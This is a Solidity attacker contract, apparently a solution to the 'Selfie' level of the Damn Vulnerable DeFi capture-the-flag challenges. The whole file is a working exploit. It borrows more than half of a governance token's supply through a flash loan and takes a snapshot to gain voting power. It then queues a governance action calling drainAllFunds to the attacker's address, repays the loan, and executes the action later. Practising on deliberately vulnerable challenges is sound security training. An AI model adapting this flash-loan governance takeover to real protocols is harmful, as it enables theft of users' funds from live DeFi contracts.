// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDamnValuableTokenSnapshot is IERC20 {
    function snapshot() external returns (uint256);
    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttacker {
    uint256 actionId;

    address owner;

    IDamnValuableTokenSnapshot token;

    ISelfiePool pool;
    ISimpleGovernance governance;

    constructor(address _token, address _pool, address _governance) {
        owner = msg.sender;

        token = IDamnValuableTokenSnapshot(_token);

        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
    }

    function flashLoan() external {
        token.snapshot();
        uint256 amountToLoan = token.getTotalSupplyAtLastSnapshot() / 2 + 1;

        pool.flashLoan(amountToLoan);
    }

    function receiveTokens(address recipient, uint256 amount) external {
        token.snapshot();
 
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        actionId = governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), amount);
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}